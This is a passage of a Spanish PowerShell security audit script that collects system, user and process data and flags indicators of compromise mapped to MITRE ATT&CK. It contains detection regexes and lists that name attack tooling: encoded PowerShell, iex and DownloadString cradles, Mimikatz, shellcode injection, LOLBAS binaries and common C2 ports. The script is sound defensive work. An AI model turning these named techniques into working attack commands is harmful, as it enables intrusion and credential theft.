<#

                    SCRIPT DE AUDITORIA DE SEGURIDAD EMPRESARIAL                       
                                VERSION 3.0 - PROFESIONAL                                


.SYNOPSIS
    Script avanzado de auditoria de seguridad empresarial que recopila informacion 
    critica del sistema en multiples formatos para analisis forense y respuesta a incidentes.

.DESCRIPTION
    Este script realiza una auditoria completa de seguridad incluyendo:
    - Analisis de sistema de archivos y archivos modificados recientemente
    - Analisis detallado de red y conexiones activas
    - Analisis de procesos, servicios y tareas programadas
    - Analisis de logs y eventos de seguridad criticos
    - Analisis de configuraciones de seguridad
    - Deteccion de indicadores de compromiso (IOCs)
    - Analisis de persistencia y registro
    
    Los resultados se exportan en JSON, CSV y TXT para analisis posterior.

.NOTES
    Autor: Equipo de Ciberseguridad
    Version: 3.0
    Fecha: 16 de septiembre de 2026
    Requisitos: PowerShell 5.1+, Windows 10/Server 2016+
    Privilegios: Se recomienda ejecutar como Administrador para auditoria completa
    Interfaz: v3.0 incluye interfaz web (carpeta ui/) y modo headless para automatizacion

.EXAMPLE
    .\Auditoria_Empresarial_Completa.ps1
    
    Ejecuta la auditoria completa y crea carpeta con timestamp en el directorio actual

.LINK
    https://docs.microsoft.com/en-us/powershell/
    https://attack.mitre.org/
#>

#Requires -Version 5.1

# Parametros para ejecucion automatizada (interfaz web / modo headless)
param(
    [string]$ResultPath = $PSScriptRoot,
    [switch]$Headless,
    [string]$StatusFile = "",
    # Allowlist propia de la maquina (JSON con la misma estructura que $Global:Allowlist).
    # Se fusiona con la built-in; no la sustituye.
    [string]$AllowlistPath = "",
    # Ejecuta la bateria de pruebas de deteccion (regex, LOLBAS, puertos, MITRE, allowlist)
    # y sale sin generar ninguna auditoria.
    [switch]$SelfTest
)

# 
# SECCION 1: CONFIGURACION INICIAL Y VARIABLES GLOBALES
# 

# Configuracion de ErrorAction por defecto
$ErrorActionPreference = "Continue"

# Variables globales del script
$Global:ScriptVersion = "3.0"
$Global:Headless = $Headless.IsPresent
$Global:StatusFile = $StatusFile
$Global:ResultPath = $ResultPath
$Global:ScriptPath = $PSCommandPath
$Global:ScriptStartTime = Get-Date
$Global:TotalModules = 10
$Global:CurrentModule = 0
$Global:WarningsCount = 0
$Global:ErrorsCount = 0
$Global:ThreatsDetected = @()
# Comprobaciones no ejecutadas (por falta de elevacion o por falta de habilitacion
# de auditoria). Se declaran en el resumen para no vender cobertura inexistente.
$Global:CoverageGaps = @()

# Puertos sospechosos comunes (C2, backdoors, malware).
# Solo se alertan cuando el DESTINO es externo: en loopback o red privada son
# trafico local (dev, servicios internos) y generan falsos positivos.
$Global:SuspiciousPorts = @(4444, 5555, 6666, 7777, 8080, 8888, 9999, 31337, 12345, 1337, 6667)

# Extensiones de archivos sospechosos para analisis
$Global:SuspiciousExtensions = @("*.exe", "*.dll", "*.ps1", "*.bat", "*.vbs", "*.js", "*.hta", "*.scr")

# Binarios LOLBAS (Living Off the Land Binaries) frecuentemente abusados
$Global:LOLBASBinaries = @(
    "certutil.exe", "regsvr32.exe", "mshta.exe", "bitsadmin.exe", 
    "regasm.exe", "regsvcs.exe", "msbuild.exe", "installutil.exe", 
    "rundll32.exe", "odbcconf.exe", "wmic.exe", "powershell.exe", "pwsh.exe", "cmd.exe"
)
# Nombres sin extension, para comparar contra Get-Process (Name no incluye .exe).
$Global:LOLBASNames = $Global:LOLBASBinaries -replace '\.exe$', ''
# Regex unico para filtrar eventos 4688 (evita el bug de precedencia -in + -replace).
$Global:LOLBASRegex = ($Global:LOLBASBinaries | ForEach-Object { [regex]::Escape($_) }) -join '|'
# Argumentos realmente sospechosos de un LOLBAS (no basta con que el binario exista).
$Global:LOLBASArgPattern = '\b(powershell|pwsh)(\.exe)?\b[^|;&]*?\s-(e|en|enco|enc|enc' + 'oded)(com' + 'mand)?\b|-urlcache|\b-split\b|-f\s+http'

# Deteccion de comando codificado: exige contexto de invocacion real de PowerShell
# en la linea de comandos. Sin ese contexto, '-e' de grep, 'node -e' o 'bash -c'
# se senalaban como comando codificado (falsos positivos CRITICAL).
$Global:EncodedCommandPattern = '\b(powershell|pwsh)(\.exe)?\b[^|;&]*?\s-(e|en|enco|enc|enc' + 'oded)(com' + 'mand)?\b'

# Patrones maliciosos comunes en PowerShell
# Nota: las cadenas se construyen por concatenacion en runtime para evitar
# falsos positivos de AMSI/antivirus sobre el propio script de auditoria.
# Patrones de deteccion como regex (el -match de PowerShell es insensible a mayusculas).
# Para cmdlets comunes se exige contexto de invocacion real (argumento o pipe) para
# evitar falsos positivos con definiciones de funciones, menciones incidentales o
# parametros inofensivos como -Encoding.
$Global:MaliciousPatterns = @(
    '\binvoke' + '-expression\s+["''$]'
    '\biex\s+["''$]'
    '\|\s*iex\b'
    $Global:EncodedCommandPattern
    '\bnet\.web' + 'client\b'
    '\bdownload' + 'string\b'
    '\bdownload' + 'file\b'
    '\bfrombase64' + 'string\b'
    '\binvoke-' + 'mimi' + 'katz\b'
    '\bmi' + 'mikatz\b'
    '\binvoke-' + 'obfuscation\b'
    '\binvoke-' + 'shellcode\b'
    '\breflective\s*pe\s*' + 'injection\b'
    '\bget-gpp' + 'password\b'
    'new-object\s+-comobject\s+wscript\.shell'
)
# Mapeo de cada deteccion a MITRE ATT&CK (Enterprise). Validado contra el extracto
# local de ATT&CK (15 tacticas, 220 tecnicas, 476 subtecnicas; ver
# C:\Users\Sammi\AI\attack_enterprise.json). El dataset completo NO va en el repo:
# solo se necesitan las 22 tecnicas que este script emite.
$Global:MitreMap = @{
    "Comando codificado"                        = @{ Id = "T1027.010"; Name = "Command Obfuscation"; Tactic = "Stealth" }
    "PowerShell comando codificado"             = @{ Id = "T1027.010"; Name = "Command Obfuscation"; Tactic = "Stealth" }
    "Patron malicioso detectado"                = @{ Id = "T1059.001"; Name = "PowerShell"; Tactic = "Execution" }
    "PowerShell patron malicioso"               = @{ Id = "T1059.001"; Name = "PowerShell"; Tactic = "Execution" }
    "Uso sospechoso de LOLBAS"                  = @{ Id = "T1218"; Name = "System Binary Proxy Execution"; Tactic = "Stealth" }
    "Proceso sin ruta"                          = @{ Id = "T1055"; Name = "Process Injection"; Tactic = "Privilege Escalation" }
    "Proceso del sistema con conexion externa"  = @{ Id = "T1036.005"; Name = "Match Legitimate Resource Name or Location"; Tactic = "Stealth" }
    "Conexion a puerto sospechoso"              = @{ Id = "T1095"; Name = "Non-Application Layer Protocol"; Tactic = "Command and Control" }
    "Usuario sin contrasena"                    = @{ Id = "T1078.003"; Name = "Local Accounts"; Tactic = "Privilege Escalation" }
    "Usuario habilitado sin uso"                = @{ Id = "T1078.003"; Name = "Local Accounts"; Tactic = "Privilege Escalation" }
    "Posible ataque de fuerza bruta"            = @{ Id = "T1110.003"; Name = "Password Spraying"; Tactic = "Credential Access" }
    "Run Key sospechoso"                        = @{ Id = "T1547.001"; Name = "Registry Run Keys / Startup Folder"; Tactic = "Persistence" }
    "Run Key con script"                        = @{ Id = "T1547.001"; Name = "Registry Run Keys / Startup Folder"; Tactic = "Persistence" }
    "Archivo ejecutable oculto"                 = @{ Id = "T1564.001"; Name = "Hidden Files and Directories"; Tactic = "Stealth" }
    "Entrada sospechosa en HOSTS"               = @{ Id = "T1557.001"; Name = "Name Resolution Poisoning and SMB Relay"; Tactic = "Credential Access" }
    "Firewall deshabilitado"                    = @{ Id = "T1686.003"; Name = "Windows Host Firewall"; Tactic = "Defense Impairment" }
    "Windows Defender deshabilitado"            = @{ Id = "T1685"; Name = "Disable or Modify Tools"; Tactic = "Defense Impairment" }
    "Proteccion en tiempo real deshabilitada"   = @{ Id = "T1685"; Name = "Disable or Modify Tools"; Tactic = "Defense Impairment" }
    "Firmas de antivirus desactualizadas"       = @{ Id = "T1685"; Name = "Disable or Modify Tools"; Tactic = "Defense Impairment" }
    "UAC deshabilitado"                         = @{ Id = "T1112"; Name = "Modify Registry"; Tactic = "Defense Impairment" }
    "Recurso compartido de disco"               = @{ Id = "T1021.002"; Name = "SMB/Windows Admin Shares"; Tactic = "Lateral Movement" }
    "Recurso compartido sin restricciones"      = @{ Id = "T1021.002"; Name = "SMB/Windows Admin Shares"; Tactic = "Lateral Movement" }
    "Driver sin firma digital"                  = @{ Id = "T1014"; Name = "Rootkit"; Tactic = "Stealth" }
    "Puerto sospechoso en escucha"              = @{ Id = "T1571"; Name = "Non-Standard Port"; Tactic = "Command and Control" }
}

# 
# SECCION 1B: ALLOWLIST LOCAL
# 
# Ruido conocido de ESTA maquina. Sin allowlist el informe queda inservible: un puerto
# 9999 de Splunk Web o el 'bash -c' de Git Bash se leen como backdoor o PowerShell
# codificado. Cada entrada declara explicitamente QUE amenazas suprime y POR QUE, de
# modo que la supresion es auditable (aparece en el resumen y en el log).
# Regla: una entrada debe nombrar Process o Ports; la supresion se limita a los
# ThreatTypes listados, nunca a todo lo que haga ese proceso.
$Global:Allowlist = @(
    @{ Id = "ui-audit-local"; ThreatTypes = @("Conexion a puerto sospechoso", "Puerto sospechoso en escucha")
       Ports = @(8501, 8502); Process = "python"
       Reason = "UI de esta auditoria (uvicorn en 127.0.0.1:8502) y su backend local" }
    @{ Id = "splunk-local"; ThreatTypes = @("Puerto sospechoso en escucha")
       Ports = @(8088, 8089, 9997, 9999); Process = "splunkd"
       Reason = "Splunk Enterprise local: 8088/9999 son Splunk Web y su API, no un C2" }
    @{ Id = "node-dev"; ThreatTypes = @("Puerto sospechoso en escucha")
       Ports = @(8080, 3080); Process = "node"
       Reason = "Servidores de desarrollo Node/agent-browser en loopback" }
    @{ Id = "tailscale"; ThreatTypes = @("Puerto sospechoso en escucha")
       Ports = @(80); Process = "tailscaled"
       Reason = "Overlay Tailscale; escucha en la interfaz tailscale0, no en la LAN" }
    @{ Id = "syncthing"; ThreatTypes = @("Puerto sospechoso en escucha")
       Ports = @(8384, 22000); Process = "syncthing"
       Reason = "Sincronizacion de carpetas (WinGet), puertos oficiales de syncthing" }
    @{ Id = "git-bash"; ThreatTypes = @("Uso sospechoso de LOLBAS", "Comando codificado", "Patron malicioso detectado")
       Process = "bash"
       Reason = 'Git Bash: su bash -c con grep -E disparaba el patron de comando codificado' }
    @{ Id = "agent-tools"; ThreatTypes = @("Proceso sin ruta")
       Process = "agent-browser"
       Reason = "Herramientas de agentes locales en AppData\\Local\\hermes (binario sin ruta legible sin elevacion)" }
    @{ Id = "postgres-dev"; ThreatTypes = @("Puerto sospechoso en escucha")
       Ports = @(5432, 5433, 5434, 6432); Process = "postgres"
       Reason = "PostgreSQL/pgbouncer/traefik de desarrollo local" }
)

# Amenazas suprimidas por la allowlist (se declaran en el resumen: no se ocultan).
$Global:SuppressedThreats = @()

# 
# SECCION 2: FUNCIONES AUXILIARES
# 

<#
.SYNOPSIS
    Muestra el banner del script con informacion de version
#>
function Show-Banner {
    if ($Global:Headless) { return }
    Clear-Host
    Write-Host "" -ForegroundColor Cyan
    Write-Host "                    AUDITORIA DE SEGURIDAD EMPRESARIAL COMPLETA                       " -ForegroundColor Cyan
    Write-Host "                              VERSION $Global:ScriptVersion - PROFESIONAL                                " -ForegroundColor Cyan
    Write-Host "" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  [INFO] Sistema: " -NoNewline -ForegroundColor Yellow
    Write-Host "$env:COMPUTERNAME" -ForegroundColor White
    Write-Host "  [USER] Usuario: " -NoNewline -ForegroundColor Yellow
    Write-Host "$env:USERNAME" -ForegroundColor White
    Write-Host "  [TIME] Fecha/Hora: " -NoNewline -ForegroundColor Yellow
    Write-Host "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor White
    Write-Host "  [PRIV] Privilegios: " -NoNewline -ForegroundColor Yellow
    
    if (Test-Administrator) {
        Write-Host "ADMINISTRADOR [OK]" -ForegroundColor Green
    } else {
        Write-Host "USUARIO NORMAL (Auditoria limitada)" -ForegroundColor Yellow
    }
    
    Write-Host ""
    Write-Host "" -ForegroundColor Gray
    Write-Host ""
}

<#
.SYNOPSIS
    Verifica si el script se esta ejecutando con privilegios de administrador
.OUTPUTS
    Boolean - True si es administrador, False si no
#>
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

<#
.SYNOPSIS
    Muestra una barra de progreso visual durante la ejecucion
.PARAMETER Activity
    Descripcion de la actividad actual
.PARAMETER Status
    Estado detallado de la operacion
.PARAMETER PercentComplete
    Porcentaje de completitud (0-100)
#>
function Show-Progress {
    param(
        [string]$Activity,
        [string]$Status,
        [int]$PercentComplete
    )
    
    Write-Progress -Activity $Activity -Status $Status -PercentComplete $PercentComplete
}

<#
.SYNOPSIS
    Actualiza el progreso basado en modulos completados
.PARAMETER ModuleName
    Nombre del modulo que se esta ejecutando
#>
function Update-ModuleProgress {
    param([string]$ModuleName)
    
    $Global:CurrentModule++
    $percentComplete = [math]::Round(($Global:CurrentModule / $Global:TotalModules) * 100)
    
    Show-Progress -Activity "Ejecutando Auditoria de Seguridad" `
                -Status "Modulo $Global:CurrentModule de $Global:TotalModules : $ModuleName" `
                -PercentComplete $percentComplete
    
    $Global:LastModuleName = $ModuleName
    Write-StatusFile -Phase "running" -Name $ModuleName -Module $Global:CurrentModule -Percent $percentComplete -Message "Ejecutando modulo $ModuleName"
}

<#
.SYNOPSIS
    Escribe el estado de la auditoria en el archivo de estado (modo headless)
    para que la interfaz web pueda mostrar el progreso en vivo.
.PARAMETER Phase
    Fase actual: running, done o error
.PARAMETER Name
    Nombre del modulo en curso
.PARAMETER Module
    Numero de modulo actual (0-10)
.PARAMETER Percent
    Porcentaje de completitud (0-100)
.PARAMETER Message
    Mensaje descriptivo opcional
.PARAMETER RiskLevel
    Nivel de riesgo final (solo en fase done)
#>
function Write-StatusFile {
    param(
        [string]$Phase,
        [string]$Name,
        [int]$Module,
        [int]$Percent,
        [string]$Message = "",
        [string]$RiskLevel = $null
    )
    
    if (-not $Global:Headless -or -not $Global:StatusFile) { return }
    
    try {
        $status = [PSCustomObject]@{
            phase = $Phase
            module = $Module
            total = $Global:TotalModules
            name = $Name
            percent = $Percent
            threats = $Global:ThreatsDetected.Count
            errors = $Global:ErrorsCount
            warnings = $Global:WarningsCount
            message = $Message
            riskLevel = $RiskLevel
            auditPath = $Global:AuditPath
            updatedAt = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
        $status | ConvertTo-Json -Compress | Set-Content -Path $Global:StatusFile -Encoding UTF8
    } catch {
        # Nunca interrumpir la auditoria por un fallo al escribir el estado
    }
}

<#
.SYNOPSIS
    Exporta datos en multiples formatos (JSON, CSV, TXT)
.PARAMETER Data
    Datos a exportar (objeto de PowerShell)
.PARAMETER BasePath
    Ruta base sin extension donde se guardaran los archivos
.PARAMETER Title
    Titulo descriptivo para el reporte TXT
#>
function Export-MultiFormat {
    param(
        [Parameter(Mandatory=$true)]
        $Data,
        
        [Parameter(Mandatory=$true)]
        [string]$BasePath,
        
        [Parameter(Mandatory=$false)]
        [string]$Title = "Reporte de Auditoria"
    )
    
    try {
        # Validar que hay datos para exportar
        if ($null -eq $Data -or ($Data -is [Array] -and $Data.Count -eq 0)) {
            Write-Warning "No hay datos para exportar en: $BasePath"
            return
        }
        
        # Exportar a JSON (formato estructurado para analisis automatizado)
        $jsonPath = "$BasePath.json"
        $Data | ConvertTo-Json -Depth 5 | Out-File $jsonPath -Encoding UTF8
        
        # Exportar a CSV (formato tabular para Excel)
        $csvPath = "$BasePath.csv"
        if ($Data -is [Array]) {
            $Data | Export-Csv $csvPath -NoTypeInformation -Encoding UTF8
        } else {
            @($Data) | Export-Csv $csvPath -NoTypeInformation -Encoding UTF8
        }
        
        # Exportar a TXT (formato legible para humanos)
        $txtPath = "$BasePath.txt"
        "" | Out-File $txtPath -Encoding UTF8
        "  $Title" | Out-File $txtPath -Append -Encoding UTF8
        "  Generado: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File $txtPath -Append -Encoding UTF8
        "" | Out-File $txtPath -Append -Encoding UTF8
        "" | Out-File $txtPath -Append -Encoding UTF8
        $Data | Format-Table -AutoSize | Out-File $txtPath -Append -Encoding UTF8 -Width 200
        
        Write-Verbose "[OK] Exportado: $BasePath en formatos json, csv y txt"
        
    } catch {
        Write-Error "Error al exportar datos a $BasePath : $($_.Exception.Message)"
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    Registra una amenaza detectada durante la auditoria
.PARAMETER ThreatType
    Tipo de amenaza (ej: "Proceso Sospechoso", "Conexion Maliciosa")
.PARAMETER Severity
    Nivel de severidad (LOW, MEDIUM, HIGH, CRITICAL)
.PARAMETER Description
    Descripcion detallada de la amenaza
.PARAMETER Details
    Objeto con detalles adicionales de la amenaza
#>
function Add-CoverageGap {
    param([string]$Check, [string]$Reason)
    $key = "$Check|$Reason"
    if ($Global:CoverageGaps -notcontains $key) {
        $Global:CoverageGaps += $key
    }
}

function Test-PrivateOrLoopbackAddress {
    param([string]$Address)
    if (-not $Address) { return $true }
    $a = $Address.ToLower()
    if ($a -eq 'localhost' -or $a.StartsWith('::1') -or $a.StartsWith('127.')) { return $true }
    if ($a -match '^10\.') { return $true }
    if ($a -match '^172\.(1[6-9]|2[0-9]|3[0-1])\.') { return $true }
    if ($a -match '^192\.168\.') { return $true }
    if ($a -match '^169\.254\.') { return $true }
    return $false
}

# Firma normalizada de una amenaza: misma deteccion en dos ejecuciones -> misma firma.
# Se quita el PID y los numeros variables para que el diff entre auditorias no se
# llene de falsas diferencias (un PID cambia en cada arranque).
function Get-ThreatSignature {
    param([string]$ThreatType, [string]$Description)
    $norm = ($ThreatType + "|" + $Description).ToLower()
    $norm = $norm -replace '\(pid: \d+\)', ''   # el PID cambia en cada arranque
    $norm = $norm -replace '\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}', ''
    $norm = $norm -replace '\s+', ' '
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($norm))
    return ([BitConverter]::ToString($hash) -replace '-', '').Substring(0, 16)
}

# Devuelve la entrada de allowlist que cubre la deteccion, o null.
function Test-AllowedByAllowlist {
    param([string]$ThreatType, [string]$Description, $Details)

    if (-not $Global:Allowlist) { return $null }

    $procName = ""
    $procPath = ""
    $ports = @()
    if ($Details) {
        foreach ($prop in @("Name", "ProcessName")) {
            try { $v = $Details.$prop } catch { $v = $null }
            if ($v) { $procName = ([string]$v).ToLower(); break }
        }
        foreach ($prop in @("Path", "ProcessPath")) {
            try { $v = $Details.$prop } catch { $v = $null }
            if ($v) { $procPath = ([string]$v).ToLower(); break }
        }
        foreach ($prop in @("RemotePort", "LocalPort", "Port")) {
            try { $v = $Details.$prop } catch { $v = $null }
            if ($v) { $ports += [int]$v }
        }
    }

    foreach ($entry in $Global:Allowlist) {
        if ($entry.ThreatTypes -and $ThreatType -notin $entry.ThreatTypes) { continue }

        $nameMatch = $true
        if ($entry.Process) {
            $p = ([string]$entry.Process).ToLower()
            $nameMatch = ($procName -and ($procName -eq $p -or $procName.StartsWith($p)))
        }
        $pathMatch = $true
        if ($entry.Path) { $pathMatch = ($procPath -and $procPath.StartsWith(([string]$entry.Path).ToLower())) }
        $portMatch = $true
        if ($entry.Ports) { $portMatch = ($ports | Where-Object { $entry.Ports -contains $_ }).Count -gt 0 }

        # Una entrada sin Process ni Ports no puede matchear: exigir al menos uno.
        if (-not $entry.Process -and -not $entry.Ports) { continue }
        if ($nameMatch -and $pathMatch -and $portMatch) { return $entry }
    }
    return $null
}

# Fusiona una allowlist externa (JSON) con la built-in.
function Load-ExternalAllowlist {
    param([string]$Path)
    if (-not $Path) { return }
    if (-not (Test-Path $Path)) {
        Write-AuditLog "Allowlist externa no encontrada: $Path" -Level WARNING
        return
    }
    try {
        $json = Get-Content $Path -Raw -Encoding UTF8 | ConvertFrom-Json
        $entries = if ($json.entries) { $json.entries } else { $json }
        $added = 0
        foreach ($e in $entries) {
            if (-not $e.Process -and -not $e.Ports) { continue }
            # Ojo: asignar `if (...) { @(...) }` a una clave de hashtable unrolla el
            # array y deja un String. Se materializan primero las variables.
            $entry = @{
                Id          = if ($e.Id) { [string]$e.Id } else { "external-$added" }
                ThreatTypes = @([string[]]@($e.ThreatTypes))
                Ports       = @([int[]]@($e.Ports))
                Process     = [string]$e.Process
                Path        = [string]$e.Path
                Reason      = if ($e.Reason) { [string]$e.Reason } else { "allowlist externa" }
            }
            $Global:Allowlist += $entry
            $added++
        }
        Write-AuditLog "Allowlist externa cargada: $added entradas desde $Path" -Level INFO
    } catch {
        Write-AuditLog "No se pudo cargar la allowlist externa: $($_.Exception.Message)" -Level ERROR
    }
}

function Add-ThreatDetection {
    param(
        [string]$ThreatType,
        [ValidateSet("LOW", "MEDIUM", "HIGH", "CRITICAL")]
        [string]$Severity,
        [string]$Description,
        $Details
    )
    
    # Deduplicacion: la misma deteccion no debe contar dos veces (infla el riesgo).
    # La clave usa la firma normalizada, no la descripcion cruda: un PID distinto no
    # es una amenaza nueva.
    $signature = Get-ThreatSignature -ThreatType $ThreatType -Description $Description
    $key = "$ThreatType|$signature"
    if (-not $Global:ThreatKeys) {
        $Global:ThreatKeys = New-Object System.Collections.Generic.HashSet[string]
    }
    if ($Global:ThreatKeys.Contains($key)) {
        Write-Verbose "Amenaza duplicada omitida: $key"
        return
    }
    [void]$Global:ThreatKeys.Add($key)
    
    $mitre = $Global:MitreMap[$ThreatType]

    # Allowlist: la supresion se registra, no se silencia. Queda en el resumen y en el log.
    $allowed = Test-AllowedByAllowlist -ThreatType $ThreatType -Description $Description -Details $Details
    if ($allowed) {
        $Global:SuppressedThreats += [PSCustomObject]@{
            ThreatType     = $ThreatType
            Severity       = $Severity
            Description    = $Description
            AllowlistId    = $allowed.Id
            Reason         = $allowed.Reason
            MitreTechnique = if ($mitre) { $mitre.Id } else { "" }
        }
        Write-AuditLog "  [ALLOWLIST] Suprimida '$ThreatType' por $($allowed.Id): $($allowed.Reason)" -Level INFO
        return
    }
    
    $threat = [PSCustomObject]@{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        ThreatType = $ThreatType
        Severity = $Severity
        Description = $Description
        Details = $Details
        MitreTechnique = if ($mitre) { $mitre.Id } else { "" }
        MitreName = if ($mitre) { $mitre.Name } else { "" }
        MitreTactic = if ($mitre) { $mitre.Tactic } else { "" }
        MitreUrl = if ($mitre) { "https://attack.mitre.org/techniques/" + $mitre.Id.Replace('.', '/') } else { "" }
        # Firma estable entre ejecuciones (sin PID ni timestamps) para comparar auditorias.
        Signature = $signature
    }
    
    $Global:ThreatsDetected += $threat
    Write-AuditLog "  [!] [$Severity] $ThreatType : $Description" -Level WARNING
    
    # Actualizar estado en modo headless con el recuento de amenazas
    if ($Global:Headless -and $Global:StatusFile) {
        Write-StatusFile -Phase "running" -Name $Global:LastModuleName -Module $Global:CurrentModule `
            -Percent ([math]::Round(($Global:CurrentModule / $Global:TotalModules) * 100)) `
            -Message "[$Severity] $ThreatType : $Description"
    }
    
    # Mostrar alerta en consola
    $color = switch ($Severity) {
        "CRITICAL" { "Red" }
        "HIGH" { "Magenta" }
        "MEDIUM" { "Yellow" }
        "LOW" { "Cyan" }
    }
    
    Write-Host "  [!]  [$Severity] $ThreatType : $Description" -ForegroundColor $color
}

<#
.SYNOPSIS
    Escribe un mensaje de log con timestamp
.PARAMETER Message
    Mensaje a registrar
.PARAMETER Level
    Nivel de log (INFO, WARNING, ERROR)
#>
function Write-AuditLog {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARNING", "ERROR", "SUCCESS")]
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    # Agregar al log file global si existe
    if ($Global:LogFile) {
        $logMessage | Out-File $Global:LogFile -Append -Encoding UTF8
    }
    
    # Mostrar en consola con colores
    $color = switch ($Level) {
        "INFO" { "White" }
        "SUCCESS" { "Green" }
        "WARNING" { "Yellow" }
        "ERROR" { "Red" }
    }
    
    Write-Host $logMessage -ForegroundColor $color
}

# 
# SECCION 3: MODULOS DE AUDITORIA
# 

<#
.SYNOPSIS
    MODULO 1: Informacion General del Sistema
.DESCRIPTION
    Recopila informacion basica del sistema operativo, hardware y configuracion
#>
function Get-SystemInformation {
    Update-ModuleProgress -ModuleName "Informacion del Sistema"
    Write-AuditLog "Iniciando recopilacion de informacion del sistema..." -Level INFO
    
    try {
        # Informacion basica del sistema
        $computerInfo = Get-ComputerInfo -ErrorAction Stop
        
        $systemInfo = [PSCustomObject]@{
            Hostname = $env:COMPUTERNAME
            Domain = $env:USERDOMAIN
            OSName = $computerInfo.OsName
            OSVersion = $computerInfo.OsVersion
            OSBuild = $computerInfo.OsBuildNumber
            OSArchitecture = $computerInfo.OsArchitecture
            Manufacturer = $computerInfo.CsManufacturer
            Model = $computerInfo.CsModel
            TotalRAM_GB = [math]::Round($computerInfo.CsTotalPhysicalMemory / 1GB, 2)
            Processors = $computerInfo.CsNumberOfProcessors
            LogicalProcessors = $computerInfo.CsNumberOfLogicalProcessors
            LastBootUpTime = $computerInfo.OsLastBootUpTime
            InstallDate = $computerInfo.OsInstallDate
            SystemUptime = (Get-Date) - $computerInfo.OsLastBootUpTime | Select-Object -ExpandProperty Days
            TimeZone = $computerInfo.TimeZone
            WindowsDirectory = $env:SystemRoot
            CurrentUser = $env:USERNAME
            IsAdmin = Test-Administrator
        }
        
        # Exportar resultados
        $outputPath = Join-Path $Global:AuditPath "01_Sistema\informacion_sistema"
        Export-MultiFormat -Data $systemInfo -BasePath $outputPath -Title "Informacion General del Sistema"
        
        Write-AuditLog "[OK] Informacion del sistema recopilada correctamente" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error al recopilar informacion del sistema: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 2: Analisis de Usuarios y Permisos
.DESCRIPTION
    Analiza cuentas de usuario locales, grupos y asignaciones de privilegios
#>
function Get-UsersAndPermissions {
    Update-ModuleProgress -ModuleName "Usuarios y Permisos"
    Write-AuditLog "Analizando usuarios y permisos del sistema..." -Level INFO
    
    try {
        # Usuarios locales
        $localUsers = Get-LocalUser | Select-Object Name, Enabled, PasswordRequired, 
            PasswordLastSet, LastLogon, AccountExpires, Description,
            @{Name="PasswordAge_Days"; Expression={
                if ($_.PasswordLastSet) {
                    ((Get-Date) - $_.PasswordLastSet).Days
                } else {
                    "Never"
                }
            }}
        
        $outputPath = Join-Path $Global:AuditPath "02_Usuarios\usuarios_locales"
        Export-MultiFormat -Data $localUsers -BasePath $outputPath -Title "Usuarios Locales del Sistema"
        
        # Detectar usuarios con configuraciones inseguras
        # Solo senalar cuentas habilitadas que realmente no tengan contrasena definida;
        # las cuentas deshabilitadas (DefaultAccount, Invitado) y las que si tienen
        # contrasena establecida no son un riesgo real.
        $localUsers | ForEach-Object {
            if ($_.Enabled -and -not $_.PasswordLastSet) {
                Add-ThreatDetection -ThreatType "Usuario sin contrasena" -Severity "HIGH" `
                    -Description "Usuario '$($_.Name)' esta habilitado y no tiene contrasena definida" -Details $_
            }
            if ($_.Enabled -and $null -eq $_.LastLogon) {
                Add-ThreatDetection -ThreatType "Usuario habilitado sin uso" -Severity "MEDIUM" `
                    -Description "Usuario '$($_.Name)' esta habilitado pero nunca ha iniciado sesion" -Details $_
            }
        }
        
        # Administradores locales
        $administrators = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue |
            Select-Object Name, ObjectClass, PrincipalSource
        
        if ($administrators) {
            $outputPath = Join-Path $Global:AuditPath "02_Usuarios\administradores_locales"
            Export-MultiFormat -Data $administrators -BasePath $outputPath -Title "Miembros del Grupo Administradores"
            
            Write-AuditLog "  -> Administradores locales: $($administrators.Count)" -Level INFO
        }
        
        # Otros grupos privilegiados
        $privilegedGroups = @("Remote Desktop Users", "Power Users", "Backup Operators")
        foreach ($group in $privilegedGroups) {
            try {
                $members = Get-LocalGroupMember -Group $group -ErrorAction SilentlyContinue
                if ($members) {
                    $groupName = $group -replace ' ', '_'
                    $outputPath = Join-Path $Global:AuditPath "02_Usuarios\grupo_$groupName"
                    Export-MultiFormat -Data $members -BasePath $outputPath -Title "Miembros del Grupo $group"
                }
            } catch {
                Write-Verbose "Grupo '$group' no existe o no tiene miembros"
            }
        }
        
        Write-AuditLog "[OK] Analisis de usuarios y permisos completado" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en analisis de usuarios: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 3: Analisis de Procesos y Servicios
.DESCRIPTION
    Analiza procesos en ejecucion, servicios y detecta anomalias
#>
function Get-ProcessesAndServices {
    Update-ModuleProgress -ModuleName "Procesos y Servicios"
    Write-AuditLog "Analizando procesos y servicios en ejecucion..." -Level INFO
    
    try {
        # Procesos en ejecucion: una sola snapshot de Get-Process (se reutiliza abajo).
        # La firma digital solo se comprueba para binarios FUERA de C:\Windows y con
        # cache por ruta: firmar 500 binarios de sistema es lo que hace tardar 2 minutos.
        $allProcesses = Get-Process
        $sigCache = @{}
        $processes = $allProcesses | Select-Object Name, Id, Path, Company, Product, 
            CPU, @{Name="Memory_MB"; Expression={[math]::Round($_.WorkingSet64/1MB, 2)}},
            StartTime, SessionId,
            @{Name="Signed"; Expression={
                $p = $_.Path
                if (-not $p) { return $null }
                if ($p.ToLower().StartsWith('c:\windows')) { return $true }
                if (-not $sigCache.ContainsKey($p)) {
                    try { $sigCache[$p] = (Get-AuthenticodeSignature -LiteralPath $p).Status }
